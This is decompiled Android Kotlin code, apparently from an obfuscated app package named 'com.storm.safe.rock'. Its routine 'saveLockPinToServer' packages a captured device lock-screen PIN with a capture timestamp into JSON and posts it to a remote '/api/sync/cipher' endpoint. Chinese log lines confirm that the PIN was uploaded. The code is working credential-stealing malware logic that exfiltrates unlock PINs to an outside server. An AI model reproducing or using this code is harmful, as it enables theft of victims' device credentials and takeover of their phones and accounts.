package com.storm.safe.rock.service;

import kotlin.coroutines.intrinsics.CoroutineSingletons;
import kotlin.coroutines.jvm.internal.SuspendLambda;
import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;
import org.json.JSONObject;
import p000.C1351vv;
import p000.InterfaceC0876mv;
import p000.InterfaceC0920no;
import p000.InterfaceC1116qn;
import p000.kg1;
import p000.l10;
import p000.t60;
import p000.tz0;

/* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
@InterfaceC1116qn(m214402c = "com.storm.safe.rock.service.dqtvuisjd$saveLockPinToServer$1", m214403f = "dqtvuisjd.kt", m214404l = {}, m214405m = "invokeSuspend")
/* loaded from: classes2.dex */
final class dqtvuisjd$saveLockPinToServer$1 extends SuspendLambda implements l10 {

    /* renamed from: a1 */
    public final /* synthetic */ String f52676a1;

    /* renamed from: a2 */
    public final /* synthetic */ String f52677a2;

    /* renamed from: a3 */
    public final /* synthetic */ String f52678a3;

    /* renamed from: a4 */
    public final /* synthetic */ String f52679a4;

    /* renamed from: a5 */
    public final /* synthetic */ String f52680a5;

    /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
    public dqtvuisjd$saveLockPinToServer$1(String str, String str2, String str3, String str4, String str5, InterfaceC0876mv interfaceC0876mv) {
        super(2, interfaceC0876mv);
        this.f52676a1 = str;
        this.f52677a2 = str2;
        this.f52678a3 = str3;
        this.f52679a4 = str4;
        this.f52680a5 = str5;
    }

    @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
    public final InterfaceC0876mv create(Object obj, InterfaceC0876mv interfaceC0876mv) {
        return new dqtvuisjd$saveLockPinToServer$1(this.f52676a1, this.f52677a2, this.f52678a3, this.f52679a4, this.f52680a5, interfaceC0876mv);
    }

    @Override // p000.l10
    public final Object invoke(Object obj, Object obj2) throws Throwable {
        dqtvuisjd$saveLockPinToServer$1 dqtvuisjd_savelockpintoserver_1 = (dqtvuisjd$saveLockPinToServer$1) create((InterfaceC0920no) obj, (InterfaceC0876mv) obj2);
        C1351vv c1351vv = C1351vv.f60710b1;
        dqtvuisjd_savelockpintoserver_1.invokeSuspend(c1351vv);
        return c1351vv;
    }

    @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
    public final Object invokeSuspend(Object obj) throws Throwable {
        String str = this.f52679a4;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        kg1.m213544f4(obj);
        try {
            JSONObject jSONObject = new JSONObject();
            jSONObject.put("cipherGradeCode", this.f52678a3);
            jSONObject.put("textCipher", str);
            jSONObject.put("patternCipher", "");
            jSONObject.put("isLocked", true);
            jSONObject.put("captureTime", System.currentTimeMillis());
            RequestBody.Companion companion = RequestBody.Companion;
            String string = jSONObject.toString();
            t60.m214694b5(string, "json.toString()");
            Response responseExecute = new OkHttpClient().newCall(new Request.Builder().url(this.f52676a1.concat("/api/sync/cipher")).header("X-Client-ID", this.f52677a2).post(companion.create(string, MediaType.Companion.get("application/json"))).build()).execute();
            String str2 = this.f52680a5;
            try {
                if (responseExecute.isSuccessful()) {
                    t60.m214714d6("dqtvuisjd", "✅ 锁屏PIN已上传到服务器: type=" + str2 + ", len=" + str.length());
                } else {
                    t60.m214726f4("dqtvuisjd", "⚠️ 锁屏PIN上传失败: " + responseExecute.code());
                }
                responseExecute.close();
            } finally {
            }
        } catch (Exception e) {
            tz0.m214807a7("锁屏PIN上传异常: ", e.getMessage(), "dqtvuisjd");
        }
        return C1351vv.f60710b1;
    }
}
